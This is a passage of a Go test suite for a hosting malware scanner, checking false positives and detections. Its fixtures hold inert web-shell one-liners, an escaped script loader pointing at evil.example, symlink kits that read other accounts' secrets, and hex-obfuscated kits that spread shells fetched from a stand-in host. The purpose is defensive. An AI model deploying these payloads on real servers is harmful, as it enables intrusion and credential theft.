package scanner

import (
	"archive/zip"
	"bytes"
	"context"
	"crypto/md5"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"syscall"
	"testing"
	"time"
)

// Every kind of file restored from quarantine after a fleet review is kept
// here, judged the way a scan of any server judges it (path and content),
// so a new or reinstalled server never quarantines them again and a later
// rule change cannot bring them back. Malware next to them must still be
// caught. Fixtures are minimal, inert shapes of the real files.
func TestFleetRestoredCategories(t *testing.T) {
	s := newScanner(t)
	cert := base64.StdEncoding.EncodeToString([]byte("-----BEGIN CERTIFICATE-----\n" +
		base64.StdEncoding.EncodeToString(bytes.Repeat([]byte{0x30, 0x82, 0x04, 0xa4}, 60)) + "\n-----END CERTIFICATE-----\n"))
	clean := []struct{ name, path, content string }{
		{"builder kit thumbnail saved as a page", "/home/u/public_html/wp-content/uploads/master_addons/templates_kits/thumbnails/image-Media.png",
			"<!DOCTYPE html><html><head><title>Just a moment...</title></head><body><script>window.location.href='/cdn-cgi/challenge'</script></body></html>"},
		{"cPanel MultiPHP ini", "/home/u/public_html/php.ini", "; cPanel-generated php ini directives, do not edit\n[PHP]\nauto_append_file = \"\"\nauto_prepend_file = \"\"\nmemory_limit = 1024M\n"},
		{"SureMails hardening ini", "/home/u/public_html/wp-content/uploads/suremails/.user.ini", "; Prevent auto-prepend/append attacks\nauto_prepend_file =\nauto_append_file =\n"},
		{"registration mail", "/home/u/shop.example.com/account/register.php", `<?php require_once '../config/db.php'; $email = trim($_POST['email'] ?? ''); @mail($email, 'Welcome - Verify Your Email', $body, 'From: '.ADMIN_EMAIL); header('Location: /account/dashboard.php');`},
		{"shipping app sign-up mail", "/home/u/public_html/application/ajax/sign_up_ajax.php", `<?php require_once("../loader.php"); $email_template = cdp_getEmailTemplates(7); $subject = $email_template->subject; mail($_POST['email'], $subject, $message, $header);`},
		{"composer ca-bundle", "/home/u/public_html/vendor/composer/ca-bundle/src/CaBundle.php", `<?php namespace Composer\CaBundle; class CaBundle { public static function isOpensslParseSafe() { $cert = '` + cert + `'; $script = "openssl_x509_parse(base64_decode('%s'));"; return $script; } }`},
		{"Laravel compiled view", "/home/u/app.example.com/storage/framework/views/4a985be53df3e16180696f04e944b6bb.php",
			`<?php $__componentOriginal8a3c0f9b5e2d4c7a1f6e9b0d3c5a7e2f = $component; ?><?php if (isset($__componentOriginal8a3c0f9b5e2d4c7a1f6e9b0d3c5a7e2f)): ?><?php $component = $__componentOriginal8a3c0f9b5e2d4c7a1f6e9b0d3c5a7e2f; ?><?php endif; ?><?php /**PATH /home/u/app/resources/views/welcome.blade.php ENDPATH**/ ?>`},
		{"analog stats cache", "/home/u/tmp/analog/cache", "CACHE type 5 produced by analog 6.0/Unix. Do not modify or delete!\nT\t0\t0\t460\n/wp-login.php?x=<?php eval($_POST[1]);?>\t1\n"},
	}
	for _, c := range clean {
		if d := s.checkContent(c.path, extOf(c.path), []byte(c.content)); d != nil {
			t.Errorf("%s: quarantined again as %s", c.name, d.Signature)
		}
	}
	elf := []byte{0x7f, 'E', 'L', 'F', 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0x3e, 0}
	for _, p := range []string{
		"/home/u/public_html/wp-content/ewww/optipng", "/home/u/site.example.com/wp-content/ewww/cwebp",
		"/home/u/public_html/news/app/ThirdParty/webp-convert/vendor/rosell-dk/webp-convert/src/Convert/Converters/Binaries/cwebp-120-linux-x86-64",
		"/home/u/public_html/node_modules/.bin/esbuild",
	} {
		if d, _ := binaryCheck(p, elf); d != nil {
			t.Errorf("%s: quarantined again as %s", p, d.Signature)
		}
	}

	// What must stay caught next to them.
	bad := []struct{ name, path, content string }{
		{"loader in ini", "/home/u/public_html/.user.ini", "auto_prepend_file = \"/home/u/public_html/wp-content/uploads/.x.ico\"\n"},
		{"open relay in a site", "/home/u/shop.example.com/admins/flyer.php", `<?php require 'common/conn.php'; $to = trim($_POST['frndemail']); $subject = $_POST["emailSubject"]; $ok = mail($to, $subject, $Body, "From: x"); header("Location: Newsletter.php");`},
		{"mail tester", "/home/u/public_html/.389653248945710.php", `<?php goto a; a: $to = $_GET["to"]; @mail($to, "Sending emails 1", "Test"); echo "##SENT##"; unlink(basename(__FILE__));`},
		{"page hidden as an upload image", "/home/u/public_html/wp-content/uploads/2026/10/logo.png", "<html><body><iframe src='https://phish.example/login'></iframe></body></html>"},
	}
	for _, c := range bad {
		if d := s.checkContent(c.path, extOf(c.path), []byte(c.content)); d == nil {
			t.Errorf("%s: no longer caught", c.name)
		}
	}
	if d, _ := binaryCheck("/home/u/site.example.com/wp-content/plugins/wp-rocket/vendor/monolog/monolog/src/Monolog/Handler/SyslogUdp/16e2277f8b31_A", elf); d == nil {
		t.Error("program hidden in a plugin's vendor folder: no longer caught")
	}
}

// Old embed codes write a script tag with document.write(unescape(...))
// (Google Analytics' ga.js loader, lead and chat widgets): only the
// brackets are escaped and the address is readable. A script or hidden
// frame spelled out in escaped letters is still reported.
func TestFleetDocumentWriteUnescape(t *testing.T) {
	ga := `var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));`
	if v := AnalyzeScript("js", []byte(ga)); v != nil {
		t.Errorf("ga.js loader reported as %s", v.Signature)
	}
	hidden := `document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%22%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%22%3E%3C%2F%73%63%72%69%70%74%3E'));`
	if v := AnalyzeScript("js", []byte(hidden)); v == nil {
		t.Error("escaped script not reported")
	}
}

// A published plugin's zip (WP-CLI's download cache on s5: the same
// WooCommerce PayPal Payments 4.1.3 zip quarantined 911 times in ten
// accounts) is judged like the installed plugin: members matching the
// version's official checksums are not reported. A changed member, a zip
// that is not one plugin, or a plugin without checksums is still checked.
func TestFleetPluginZipOfficialMembers(t *testing.T) {
	packed := []byte("<?php $d='" + strings.Repeat("QUFB", 600) + "';eval(base64_decode($d));")
	if d := analyze(".php", packed); d == nil || d.Category != CatVirus {
		t.Fatalf("fixture: %+v", d)
	}
	main := []byte("<?php\n/**\n * Plugin Name: Pay Example\n * Version: 4.1.3\n */\n")
	mk := func(name string, files map[string][]byte) string {
		p := filepath.Join(t.TempDir(), name)
		f, _ := os.Create(p)
		w := zip.NewWriter(f)
		for n, c := range files {
			e, _ := w.Create(n)
			e.Write(c)
		}
		w.Close()
		f.Close()
		return p
	}
	official := md5.Sum(packed)
	var asked []string
	known := func(slug, version, rel string, sum [16]byte) bool {
		asked = append(asked, slug+"@"+version+":"+rel)
		return slug == "pay-example" && version == "4.1.3" && rel == "build/loader.php" && sum == official
	}
	plugin := map[string][]byte{"pay-example/pay-example.php": main, "pay-example/build/loader.php": packed}
	z := mk("pay-example-4.1.3.zip", plugin)
	fi, _ := os.Stat(z)
	if d := scanZipKnown(z, fi.Size(), known); d != nil {
		t.Fatalf("official plugin zip reported: %s (asked %v)", d.Signature, asked)
	}
	// Without the checksums the same zip is reported.
	if d := scanZipKnown(z, fi.Size(), nil); d == nil {
		t.Fatal("zip not checked without checksums")
	}
	// A changed member.
	changed := append(append([]byte{}, packed...), ' ')
	z2 := mk("pay-example-4.1.3.zip", map[string][]byte{"pay-example/pay-example.php": main, "pay-example/build/loader.php": changed})
	fi, _ = os.Stat(z2)
	if d := scanZipKnown(z2, fi.Size(), known); d == nil {
		t.Fatal("changed member not reported")
	}
	// Not one plugin folder: a shell next to a copy of the official file.
	z3 := mk("pay-example-4.1.3.zip", map[string][]byte{"pay-example/pay-example.php": main, "pay-example/build/loader.php": packed, "x.php": changed})
	fi, _ = os.Stat(z3)
	if d := scanZipKnown(z3, fi.Size(), func(string, string, string, [16]byte) bool { return true }); d == nil {
		t.Fatal("mixed zip trusted")
	}
}

// A2 F6: files trusted by name, place and shape (Softaculous's login file,
// WordPress translation files) stay trusted, but not when they call
// something named at run time on request data, and never when their exact
// content is known malware. Fixtures call harmless functions (strtoupper):
// only the shape matters.
func TestFleetShapeTrustNeedsNoDynamicCall(t *testing.T) {
	s := newScanner(t)
	root := t.TempDir()
	os.WriteFile(filepath.Join(root, "wp-config.php"), []byte("<?php define('X', 1);"), 0o644)
	sapp := filepath.Join(root, "sapp-wp-signon.php")
	l10n := filepath.Join(root, "wp-content", "languages", "plugins", "demo-en_GB.l10n.php")
	os.MkdirAll(filepath.Dir(l10n), 0o755)
	l10nOK := "<?php\nreturn ['domain'=>'demo','messages'=>['Run (now)'=>'Run (now)','Save'=>'Save']];\n"
	for _, c := range []struct {
		path, content string
		trusted       bool
	}{
		{sapp, sappSignon, true},
		{sapp, sappSignon + "\n$cb = $_REQUEST['cb']; $cb('x');", false},
		{sapp, sappSignon + "\n$a = array($_REQUEST['cb']); $a[0]('x');", false},
		{sapp, sappSignon + "\n('str'.'toupper')(getenv('HTTP_X'));", false},
		{sapp, sappSignon + "\narray_map($_REQUEST['cb'], array('x'));", false},
	} {
		if got := trustedHostingTool(c.path, []byte(c.content)); got != c.trusted {
			t.Errorf("login file %q: trusted %v, want %v", c.content[len(c.content)-30:], got, c.trusted)
		}
	}
	for _, c := range []struct {
		content string
		trusted bool
	}{
		{l10nOK, true},
		{"<?php\nreturn ['domain'=>('str'.'toupper')(getenv('HTTP_X'))];\n", false},
		{"<?php\nreturn ['domain'=>array_map('str'.'toupper', ['x'])];\n", false},
		{"<?php\nreturn ['domain'=>$GLOBALS['cb']('x')];\n", false},
		{"<?php\nreturn ['domain'=>file_get_contents('php://input')];\n", false},
	} {
		if got := translationFile(l10n, []byte(c.content)); got != c.trusted {
			t.Errorf("translation %q: trusted %v, want %v", c.content, got, c.trusted)
		}
	}

	// Known-bad content under a trusted shape is still caught by its hash.
	os.WriteFile(sapp, []byte(sappSignon), 0o644)
	info, _ := os.Lstat(sapp)
	if d, err := s.CheckFile(sapp, info, s.Settings.Get().Scanner); d != nil || err == nil {
		t.Fatalf("login file not trusted: %v %v", d, err)
	}
	sum := sha256.Sum256([]byte(sappSignon))
	os.MkdirAll(filepath.Dir(HashDBPath()), 0o700)
	os.WriteFile(HashDBPath(), []byte(fmt.Sprintf("%d %s XG-TEST.KnownBad\n", len(sappSignon), hex.EncodeToString(sum[:]))), 0o600)
	ReloadHashDB()
	t.Cleanup(func() { os.Remove(HashDBPath()); ReloadHashDB() })
	if d, _ := s.CheckFile(sapp, info, s.Settings.Get().Scanner); d == nil || d.Signature != "XG-TEST.KnownBad" {
		t.Fatalf("known-bad hash skipped for a trusted shape: %v", d)
	}
}

// A credential theft kit (server1, business300, server100: folders of
// links named <account>-WordPress-public_html.txt, one to every account's
// wp-config.php, .env and .accesshash) was only reported, so the links
// stayed readable. A link to another account's files is removed whenever
// malware is quarantined, also a dangling one waiting for a secret file to
// appear; the targets are never touched, and Restore makes the link again.
// Links inside the account itself or to public files stay.
func TestFleetSymlinkTheftKit(t *testing.T) {
	if os.Geteuid() != 0 {
		t.Skip("needs root to own files as other accounts")
	}
	s := newScanner(t)
	if _, err := s.Settings.Patch([]byte(`{"scanner":{"virus_action":"quarantine"}}`)); err != nil {
		t.Fatal(err)
	}
	base := t.TempDir()
	thief, victim := filepath.Join(base, "thief"), filepath.Join(base, "victim")
	const thiefUID, victimUID = 65533, 65532
	for _, d := range []string{filepath.Join(thief, "public_html", "kit"), filepath.Join(victim, "public_html")} {
		os.MkdirAll(d, 0o755)
	}
	secret := filepath.Join(victim, "public_html", "wp-config.php")
	os.WriteFile(secret, []byte("<?php // inert fixture: define('DB_PASSWORD', 'x');"), 0o640)
	own := filepath.Join(thief, "public_html", "index.php")
	os.WriteFile(own, []byte("<?php echo 1;"), 0o644)
	filepath.Walk(victim, func(p string, _ os.FileInfo, _ error) error { return os.Lchown(p, victimUID, victimUID) })
	homes := map[uint32]string{thiefUID: thief, victimUID: victim}
	kit := filepath.Join(thief, "public_html", "kit")
	links := map[string]string{
		"victim-WordPress-public_html.txt": secret,                                    // live
		"victim-cpanel.txt":                filepath.Join(victim, ".accesshash"),      // dangling secret
		"victim-env.txt":                   filepath.Join(victim, "public_html/.env"), // dangling secret
	}
	for name, target := range links {
		p := filepath.Join(kit, name)
		os.Symlink(target, p)
		os.Lchown(p, thiefUID, thiefUID)
	}
	keep := map[string]string{
		"own.txt":     own,                                           // the account's own file
		"missing.txt": filepath.Join(victim, "public_html/logo.png"), // dangling, not a secret
	}
	for name, target := range keep {
		p := filepath.Join(kit, name)
		os.Symlink(target, p)
		os.Lchown(p, thiefUID, thiefUID)
	}
	for name := range keep {
		if _, bad := InsecureSymlink(filepath.Join(kit, name), homes); bad {
			t.Errorf("%s: flagged", name)
		}
	}
	var ids []int64
	for name, target := range links {
		p := filepath.Join(kit, name)
		got, bad := InsecureSymlink(p, homes)
		if !bad || got != target {
			t.Fatalf("%s: not flagged (%q %v)", name, got, bad)
		}
		info, _ := os.Lstat(p)
		f, err := s.Record(0, "manual", p, info, Detection{CatSymlink, "Symlink.OtherAccount -> " + got})
		if err != nil || f.Status != "quarantined" {
			t.Fatalf("%s: %+v %v", name, f, err)
		}
		if _, err := os.Lstat(p); !os.IsNotExist(err) {
			t.Fatalf("%s: link still there", name)
		}
		ids = append(ids, f.ID)
	}
	if st, err := os.Stat(secret); err != nil || st.Mode().Perm() != 0o640 {
		t.Fatalf("target touched: %v %v", st, err)
	}
	if err := s.Restore(ids[0]); err != nil {
		t.Fatal(err)
	}
	f, _ := s.Get(ids[0])
	if back, err := os.Readlink(f.Path); err != nil || back != links[filepath.Base(f.Path)] {
		t.Fatalf("restore: %q %v", back, err)
	}
	if li, _ := os.Lstat(f.Path); li.Sys().(*syscall.Stat_t).Uid != thiefUID {
		t.Fatal("restored link lost its owner")
	}
	if err := s.Delete(ids[1]); err != nil {
		t.Fatalf("delete a removed link: %v", err)
	}
}

// A web shell padded past the size limit (server1's report: an 11 MB file
// is never read) is judged by its start and end; a big clean PHP file (a
// generated translation array) stays clean.
func TestFleetPaddedBigPHP(t *testing.T) {
	s := newScanner(t)
	cfg := s.Settings.Get().Scanner
	limit := int64(cfg.MaxFileSizeMB) << 20
	dir := t.TempDir()
	pad := strings.Repeat("/* lorem ipsum dolor sit amet */\n", int(limit/33)+1000)
	bad := filepath.Join(dir, "cache-handler.php")
	os.WriteFile(bad, []byte(pad+"<?php @eval($_POST['a']); ?>\n"), 0o644)
	var b strings.Builder
	b.WriteString("<?php\nreturn array(\n")
	for i := 0; int64(b.Len()) <= limit+(1<<20); i++ {
		fmt.Fprintf(&b, "  'string_%d' => 'Translated text number %d',\n", i, i)
	}
	b.WriteString(");\n")
	clean := filepath.Join(dir, "lang-ur.php")
	os.WriteFile(clean, []byte(b.String()), 0o644)
	for path, want := range map[string]bool{bad: true, clean: false} {
		info, _ := os.Stat(path)
		if info.Size() <= limit {
			t.Fatalf("%s: fixture not over the limit", path)
		}
		d, err := s.CheckFile(path, info, cfg)
		if (d != nil) != want {
			t.Errorf("%s: detection %+v (%v), want %v", filepath.Base(path), d, err, want)
		}
	}
}

// System links reported as "Symlink.OtherAccount" on business500,
// business600 and server1: cPanel's /home/user -> /home2/user and CageFS's
// skeleton (owned by root), ~/logs/<domain>.bkup -> the domlog cPanel keeps
// as root:<account> 0640, and npm's node_modules/.bin links to files
// unpacked with another uid inside the account's own home. None lets the
// account read anything it could not read already. A kit link to another
// account's wp-config.php is still flagged.
func TestFleetSystemSymlinks(t *testing.T) {
	if os.Geteuid() != 0 {
		t.Skip("needs root to own files as other accounts")
	}
	const userUID, otherUID = 65531, 65530
	base := t.TempDir()
	os.Chmod(base, 0o755)
	user, other := filepath.Join(base, "home", "user"), filepath.Join(base, "home2", "other")
	logs := filepath.Join(base, "domlogs")
	for _, d := range []string{filepath.Join(user, "logs"), filepath.Join(user, "nodevenv", "node_modules", ".bin"), filepath.Join(user, "nodevenv", "node_modules", "esbuild", "bin"),
		filepath.Join(other, "public_html"), logs, filepath.Join(base, "home")} {
		os.MkdirAll(d, 0o755)
	}
	os.Lchown(user, userUID, userUID)
	os.Lchown(other, otherUID, otherUID)
	write := func(p string, mode os.FileMode, uid, gid int) {
		os.WriteFile(p, []byte("inert fixture"), mode)
		os.Chmod(p, mode)
		os.Lchown(p, uid, gid)
	}
	domlog := filepath.Join(logs, "example.com.bkup")
	write(domlog, 0o640, 0, userUID)
	tool := filepath.Join(user, "nodevenv", "node_modules", "esbuild", "bin", "esbuild")
	write(tool, 0o750, 1001, 1001)
	secret := filepath.Join(other, "public_html", "wp-config.php")
	write(secret, 0o640, otherUID, otherUID)
	homes := map[uint32]string{userUID: user, otherUID: other}
	link := func(target, p string, uid int) string {
		os.Symlink(target, p)
		os.Lchown(p, uid, uid)
		return p
	}
	clean := map[string]string{
		"cPanel /home link":  link(other, filepath.Join(base, "home", "other"), 0),
		"domlog backup link": link(domlog, filepath.Join(user, "logs", "example.com.bkup"), userUID),
		"npm .bin link":      link(tool, filepath.Join(user, "nodevenv", "node_modules", ".bin", "esbuild"), userUID),
	}
	for name, p := range clean {
		if got, bad := InsecureSymlink(p, homes); bad {
			t.Errorf("%s flagged (-> %s)", name, got)
		}
	}
	kit := link(secret, filepath.Join(user, "other-WordPress-public_html.txt"), userUID)
	if got, bad := InsecureSymlink(kit, homes); !bad || got != secret {
		t.Fatalf("kit link to another account's wp-config.php not flagged: %q %v", got, bad)
	}
	// Someone else's file the account cannot read (not its group) is still flagged.
	private := filepath.Join(logs, "private.log")
	write(private, 0o640, 0, otherUID)
	if _, bad := InsecureSymlink(link(private, filepath.Join(user, "logs", "private.log"), userUID), homes); !bad {
		t.Fatal("link to an unreadable file of another group not flagged")
	}
	// Findings reported before are closed when the agent starts; the kit's
	// stays open.
	s := newScanner(t)
	ids := map[string]int64{}
	for name, p := range map[string]string{"system": clean["cPanel /home link"], "domlog": clean["domlog backup link"], "kit": kit} {
		res, err := s.DB.Exec(`INSERT INTO findings (scan_id, source, path, owner, category, signature, sha256, size, status, created_at, updated_at) VALUES (1,'manual',?,'u','symlink','Symlink.OtherAccount','',10,'detected',1,1)`, p)
		if err != nil {
			t.Fatal(err)
		}
		ids[name], _ = res.LastInsertId()
	}
	if n, err := s.CloseSafeLinks(); err != nil || n != 2 {
		t.Fatalf("closed %d (%v), want 2", n, err)
	}
	for name, want := range map[string]string{"system": "cleared", "domlog": "cleared", "kit": "detected"} {
		if f, _ := s.Get(ids[name]); f.Status != want {
			t.Errorf("%s: status %q, want %q", name, f.Status, want)
		}
	}
}

// Malware run by cron from ~/.cache/.<hex> (business500: baezonco,
// dndsnatu) was only caught by a learned hash: the scan skipped ~/.cache.
// Its own files are checked now; package caches below it stay skipped.
func TestFleetHomeCacheLoader(t *testing.T) {
	s := newScanner(t)
	root := writeTree(t, map[string]string{
		".cache/.6c06cf44589da250b74db94f6909955535088504a": malicious["eval.php"],
		".cache/composer/files/vendor/pkg/x.php":            malicious["eval.php"],
		"public_html/index.php":                             "<?php echo 'hello';",
	})
	// A scan of the account, and a full scan (the home is one of the roots).
	for _, roots := range [][]string{{root}, {root, t.TempDir()}} {
		var hits []string
		_, err := s.scanTree(context.Background(), roots, time.Time{}, 0, s.Settings.Get().Scanner, treeHooks{
			hit: func(path string, _ fs.FileInfo, _ Detection) { hits = append(hits, path) },
		})
		if err != nil {
			t.Fatal(err)
		}
		if len(hits) != 1 || !strings.HasSuffix(hits[0], "/.cache/.6c06cf44589da250b74db94f6909955535088504a") {
			t.Fatalf("roots %v: hits %v, want only the loader in ~/.cache", roots, hits)
		}
	}
}

// The kit writes a site's .htaccess back over and over (business500
// masfosur: 784 times). Each return is cleaned in place: the site keeps
// its WordPress rules instead of losing the file each time.
func TestFleetReturnedRootHtaccessCleaned(t *testing.T) {
	s := newScanner(t)
	if _, err := s.Settings.Patch([]byte(`{"scanner":{"virus_action":"quarantine"}}`)); err != nil {
		t.Fatal(err)
	}
	site := filepath.Join(t.TempDir(), "public_html")
	os.MkdirAll(site, 0o755)
	os.WriteFile(filepath.Join(site, "wp-config.php"), []byte("<?php // inert fixture"), 0o640)
	hacked := "<FilesMatch '.(py|exe|php|PHP|Php|suspected)$'>\nOrder allow,deny\nDeny from all\n</FilesMatch>\n" +
		"<FilesMatch '^(index.php|wp-login.php|adminfuns.php)$'>\nOrder allow,deny\nAllow from all\n</FilesMatch>\n" +
		"<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . index.php [L]\n</IfModule>\n"
	ht := filepath.Join(site, ".htaccess")
	os.WriteFile(ht, []byte(hacked), 0o644)
	info, _ := os.Lstat(ht)
	d := htaccessHack([]byte(hacked))
	if d == nil {
		t.Fatal("fixture not detected")
	}
	// The state on the server: the first copy quarantined, the cleaning
	// lost the race with the kit's next write.
	sum := sha256File(ht)
	if _, err := s.DB.Exec(`INSERT INTO findings (scan_id, source, path, owner, category, signature, sha256, size, status, created_at, updated_at) VALUES (0,'realtime',?,'u','virus',?,?,?,'quarantined',1,1)`,
		ht, d.Signature, sum, info.Size()); err != nil {
		t.Fatal(err)
	}
	f, err := s.Record(0, "realtime", ht, info, *d)
	if err != nil || f.Status != "quarantined" || f.Repeats != 1 {
		t.Fatalf("%+v %v", f, err)
	}
	got, err := os.ReadFile(ht)
	if err != nil {
		t.Fatal("site's .htaccess removed")
	}
	if htaccessHack(got) != nil || !strings.Contains(string(got), "RewriteRule . index.php [L]") {
		t.Fatalf("not cleaned: %q", got)
	}
	// Elsewhere a returned file is still removed.
	other := filepath.Join(site, "wp-content", "uploads", ".htaccess")
	os.MkdirAll(filepath.Dir(other), 0o755)
	os.WriteFile(other, []byte(hacked), 0o644)
	oi, _ := os.Lstat(other)
	s.DB.Exec(`INSERT INTO findings (scan_id, source, path, owner, category, signature, sha256, size, status, created_at, updated_at) VALUES (0,'realtime',?,'u','virus',?,?,?,'quarantined',1,1)`,
		other, d.Signature, sum, oi.Size())
	if _, err := s.Record(0, "realtime", other, oi, *d); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Lstat(other); err == nil {
		t.Fatal("returned lock in uploads not removed")
	}
}

// buildPhar writes a phar in PHP's format (uncompressed members).
func buildPhar(stub string, files map[string]string) []byte {
	var man, data bytes.Buffer
	u32 := func(b *bytes.Buffer, v int) { b.Write([]byte{byte(v), byte(v >> 8), byte(v >> 16), byte(v >> 24)}) }
	u32(&man, len(files))
	man.Write([]byte{0x11, 0x00}) // API 1.1.0
	u32(&man, 0x10000)            // has a signature
	u32(&man, 0)                  // alias
	u32(&man, 0)                  // metadata
	names := make([]string, 0, len(files))
	for n := range files {
		names = append(names, n)
	}
	sort.Strings(names)
	for _, n := range names {
		u32(&man, len(n))
		man.WriteString(n)
		u32(&man, len(files[n]))
		u32(&man, 1792800000)
		u32(&man, len(files[n]))
		u32(&man, 0)
		u32(&man, 0o644)
		u32(&man, 0)
		data.WriteString(files[n])
	}
	var out bytes.Buffer
	out.WriteString(stub + "__HALT_COMPILER(); ?>\r\n")
	u32(&out, man.Len())
	out.Write(man.Bytes())
	out.Write(data.Bytes())
	out.Write(bytes.Repeat([]byte{0xab}, 20))
	out.Write([]byte{2, 0, 0, 0})
	out.WriteString("GBMB")
	return out.Bytes()
}

// composer.phar (the official 2.8.12, in aroojacademy's home on server100)
// and wp-cli.phar were "PHP.Obfuscated.HaltCompilerPayload": the
// libraries' own eval after __HALT_COMPILER, judged as one file. A phar is
// judged by its stub and each script in it now; a web shell inside one, or
// in its stub, is still caught, and a file that only looks like a phar is
// judged as before.
func TestFleetPharByMembers(t *testing.T) {
	s := newScanner(t)
	stub := "#!/usr/bin/env php\n<?php\nPhar::mapPhar('tool.phar');\nrequire 'phar://tool.phar/bin/tool';\n"
	lib := map[string]string{
		"bin/tool":                 "<?php\nrequire __DIR__ . '/../src/App.php';\n(new App())->run();\n",
		"src/App.php":              "<?php\nclass App { public function run() { echo 'inert fixture'; } }\n",
		"vendor/twig/Template.php": "<?php\n// a template engine compiles templates to PHP\nfunction render(string $compiled) { return eval('?>' . $compiled); }\n",
	}
	check := func(name string, content []byte) *Detection {
		t.Helper()
		p := filepath.Join(t.TempDir(), name)
		os.WriteFile(p, content, 0o644)
		info, _ := os.Lstat(p)
		d, err := s.CheckFile(p, info, s.Settings.Get().Scanner)
		if err != nil && err != ErrTrusted {
			t.Fatal(err)
		}
		return d
	}
	clean := buildPhar(stub, lib)
	if old := analyze(".phar", clean); old == nil || old.Signature != "PHP.Obfuscated.HaltCompilerPayload" {
		t.Fatalf("fixture does not reproduce the old false positive: %+v", old)
	}
	if d := check("composer.phar", clean); d != nil {
		t.Fatalf("clean phar flagged: %+v", d)
	}
	shell := map[string]string{"src/App.php": lib["src/App.php"], "src/x.php": "<?php @eval($_POST['a']); ?>"}
	if d := check("tool.phar", buildPhar(stub, shell)); d == nil || d.Category != CatVirus || !strings.HasPrefix(d.Signature, "Archive.") {
		t.Fatalf("web shell inside a phar: %+v", d)
	}
	if d := check("tool.phar", buildPhar("<?php @eval($_POST['a']); ?>\n<?php ", lib)); d == nil || d.Category != CatVirus {
		t.Fatalf("web shell in the stub: %+v", d)
	}
	broken := append([]byte(stub+"__HALT_COMPILER(); ?>\n"), []byte("\xff\xff\xff\x7f garbage eval($x)")...)
	if d := check("tool.phar", broken); d == nil {
		t.Fatal("not a phar: no longer judged as a whole")
	}
}

// escapeAll writes a string as PHP hex escapes, as kits hide their strings.
func escapeAll(s string) string {
	var b strings.Builder
	for i := 0; i < len(s); i++ {
		fmt.Fprintf(&b, "\\x%02x", s[i])
	}
	return b.String()
}

// A kit in a hex-named file in uploads (a sample from another product's
// quarantine, 2026-10-24) that the rules missed: goto-flattened, every
// string escaped, no eval and no decoder. It creates mail accounts for
// spam in every domain (~/etc/<domain>/shadow and the mailbox folders) and
// copies shells fetched from a web address into every site, and starts
// with an HTML comment, so as a file without an extension it was not
// even read as PHP. Inert fixtures of both behaviours; a mail plugin that
// only talks about mailboxes, and a script reading the system's
// /etc/shadow, are not flagged.
func TestFleetMassMailKit(t *testing.T) {
	s := newScanner(t)
	mailKit := "<!-- https://t.me/example -->\r\n<?php\n goto a1; a2: $p = \"" + escapeAll("/home/u/etc/") + "{$d}" + escapeAll("/shadow") + "\"; goto a3; a1: $d = \"" + escapeAll("example.test") + "\"; goto a2;\n" +
		" a3: @mkdir(\"" + escapeAll("/home/u/mail/") + "{$d}" + escapeAll("/info/cur") + "\", 0755, true); file_put_contents($p, \"" + escapeAll("info:x:inert") + "\", FILE_APPEND); file_put_contents(\"" + escapeAll("/home/u/mail/") + "{$d}" + escapeAll("/info/dovecot-uidlist") + "\", \"\");\n"
	spreader := "<?php\n goto b1; b1: $u = \"" + escapeAll("https://example.invalid/kit/shell.txt") + "\"; $c = file_get_contents($u); goto b2;\n" +
		" b2: foreach (glob(\"" + escapeAll("/home/*/public_html") + "\") as $r) { if (is_dir($r)) { file_put_contents($r . \"" + escapeAll("/wp-content/x.php") + "\", $c); } }\n"
	check := func(name, content string) *Detection {
		t.Helper()
		p := filepath.Join(t.TempDir(), "public_html", "wp-content", "uploads", name)
		os.MkdirAll(filepath.Dir(p), 0o755)
		os.WriteFile(p, []byte(content), 0o644)
		info, _ := os.Lstat(p)
		d, err := s.CheckFile(p, info, s.Settings.Get().Scanner)
		if err != nil && err != ErrTrusted {
			t.Fatal(err)
		}
		return d
	}
	if d := check("2c97f8049bc68e5b23793559ecd6025c", mailKit); d == nil || d.Signature != "PHP.Spam.MailAccountCreator" || d.Category != CatVirus {
		t.Fatalf("mail account kit without an extension: %+v", d)
	}
	if d := check("x.php", spreader); d == nil || d.Signature != "PHP.Dropper.RemoteSpreader" {
		t.Fatalf("remote shell spreader: %+v", d)
	}
	clean := map[string]string{
		"webmail-help.php": "<?php\n// Shows the account's mailboxes (dovecot keeps them in ~/mail/<domain>/<user>/cur).\n$log = __DIR__ . '/mailbox.log';\nfile_put_contents($log, date('c') . \" listed\\n\", FILE_APPEND);\necho 'Mail is delivered to /home/u/mail/example.test/info/new';\n",
		"server-check.php": "<?php\n$ok = is_readable('/etc/shadow') ? 'readable' : 'protected';\nfile_put_contents(__DIR__ . '/check.txt', $ok);\necho 'dovecot status checked';\n",
	}
	for name, content := range clean {
		if d := check(name, content); d != nil {
			t.Errorf("%s flagged: %+v", name, d)
		}
	}
}

// business200 (2026-10-26): one name (worksec.php) copied into 42
// WordPress core folders of a site, with no finding: each copy's content
// passed the content rules. WordPress keeps no PHP in its css and images
// folders; a copy there with copies in other core folders is a dropper,
// one alone is suspicious. Core's own PHP (wp-includes/fonts since 6.5,
// wp-admin/includes) and other folders called so stay alone.
func TestFleetPlantedInWordPressCore(t *testing.T) {
	s := newScanner(t)
	root := filepath.Join(t.TempDir(), "u", "public_html")
	put := func(rel, body string) {
		os.MkdirAll(filepath.Join(root, filepath.Dir(rel)), 0o755)
		os.WriteFile(filepath.Join(root, rel), []byte(body), 0o644)
	}
	put("wp-includes/version.php", "<?php $wp_version = '7.1.3';")
	inert := "<?php /* inert test fixture */ echo 'x';"
	for _, d := range []string{"wp-admin/css", "wp-admin/images", "wp-includes/css", "wp-includes/ID3", "wp-includes/IXR", "wp-includes/Text"} {
		put(d+"/worksec.php", inert)
	}
	put("wp-includes/images/lonely.php", inert)
	put("wp-includes/fonts/class-wp-font-face.php", "<?php class WP_Font_Face {}")
	put("wp-admin/includes/custom-helper.php", inert)
	check := func(rel string) *Detection {
		return s.checkContent(filepath.Join(root, rel), ".php", []byte(inert))
	}
